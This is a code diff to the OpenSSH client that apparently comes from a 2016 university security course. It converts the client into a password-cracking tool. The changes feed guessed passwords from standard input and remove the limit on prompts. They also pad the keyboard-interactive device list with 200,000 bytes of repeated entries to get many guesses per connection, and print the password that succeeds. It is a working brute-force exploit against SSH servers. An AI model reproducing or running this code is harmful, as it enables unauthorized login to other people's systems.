@@ -84,6 +84,7 @@ extern Options options;
 /*
  * SSH2 key exchange
  */
+char password[1024];
 
 u_char *session_id2 = NULL;
 u_int session_id2_len = 0;
@@ -507,6 +508,8 @@ input_userauth_success(int type, u_int32_t seq, void *ctxt)
 		authctxt->method->cleanup(authctxt);
 	free(authctxt->methoddata);
 	authctxt->methoddata = NULL;
+ 	printf("\n### LOGIN SUCCESS ### PASSWORD: %s\n\n", password);
+ 	exit(0);
 	authctxt->success = 1;			/* break out */
 	return 0;
 }
@@ -876,27 +879,33 @@ userauth_passwd(Authctxt *authctxt)
 {
 	static int attempt = 0;
 	char prompt[150];
-	char *password;
+	//char *password;
 	const char *host = options.host_key_alias ?  options.host_key_alias :
 	    authctxt->host;
+    char *pos;
+	//if (attempt++ >= options.number_of_password_prompts)
+	//	return 0;
 
-	if (attempt++ >= options.number_of_password_prompts)
-		return 0;
+	//if (attempt != 1)
+	//	error("Permission denied, please try again.");
 
-	if (attempt != 1)
-		error("Permission denied, please try again.");
-
-	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
-	    authctxt->server_user, host);
-	password = read_passphrase(prompt, 0);
-	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+	//snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+	//    authctxt->server_user, host);
+	//password = read_passphrase(prompt, 0);
+	printf("attempting password\n");
+    packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
 	packet_put_cstring(authctxt->service);
 	packet_put_cstring(authctxt->method->name);
 	packet_put_char(0);
+    if(fgets(password,1024,stdin)==NULL)
+        exit(0);
+    if((pos=strchr(password,'\n')) != NULL)
+        *pos = '\0';
+    printf("userauth_password:%s\n",password);
 	packet_put_cstring(password);
-	explicit_bzero(password, strlen(password));
-	free(password);
+	//explicit_bzero(password, strlen(password));
+	//free(password);
 	packet_add_padding(64);
 	packet_send();
 
@@ -1374,7 +1383,10 @@ int
 userauth_kbdint(Authctxt *authctxt)
 {
 	static int attempt = 0;
-
+	char *devicebuffer;
+	int i;
+    printf("Modified SSH Client for password cracking\n Created by Zachary Schroeder, and Group 1 for CSE5472 October 2016\n");
+printf("using kbdint (Keyboard Interactive Method)!\n");
 	if (attempt++ >= options.number_of_password_prompts)
 		return 0;
 	/* disable if no SSH2_MSG_USERAUTH_INFO_REQUEST has been seen */
@@ -1390,8 +1402,19 @@ userauth_kbdint(Authctxt *authctxt)
 	packet_put_cstring(authctxt->service);
 	packet_put_cstring(authctxt->method->name);
 	packet_put_cstring("");					/* lang */
-	packet_put_cstring(options.kbd_interactive_devices ?
-	    options.kbd_interactive_devices : "");
+		devicebuffer = calloc(1, 200000);
+  if (!devicebuffer) {
+  	fatal("cannot allocate devicebuffer");
+  }
+ 
+  for (i=0;i<200000-2;i+=2) {
+  	memcpy(devicebuffer + i, "p,", 2);
+  }
+ 	devicebuffer[200000] = 0;
+
+packet_put_cstring(devicebuffer);
+	//packet_put_cstring(options.kbd_interactive_devices ?
+	//    options.kbd_interactive_devices : "");
 	packet_send();
 
 	dispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, &input_userauth_info_req);
@@ -1406,8 +1429,10 @@ input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
 {
 	Authctxt *authctxt = ctxt;
 	char *name, *inst, *lang, *prompt, *response;
+	//char *name, *inst, *lang, *prompt;
 	u_int num_prompts, i;
-	int echo = 0;
+	//int echo = 0;
+	char *pos;
 
 	debug2("input_userauth_info_req");
 
@@ -1440,14 +1465,15 @@ input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
 	debug2("input_userauth_info_req: num_prompts %d", num_prompts);
 	for (i = 0; i < num_prompts; i++) {
 		prompt = packet_get_string(NULL);
-		echo = packet_get_char();
-
-		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
-
-		packet_put_cstring(response);
-		explicit_bzero(response, strlen(response));
-		free(response);
-		free(prompt);
+		packet_get_char();
+ 		if (fgets(password, 1024, stdin) == NULL)
+ 			exit(0);
+ 		if ((pos=strchr(password, '\n')) != NULL)
+ 			*pos = '\0';
+ 		printf("attempting password: %s\n", password);
+ 		packet_put_cstring(password);
+		
+        free(prompt);
 	}
 	packet_check_eom(); /* done with parsing incoming message. */
 
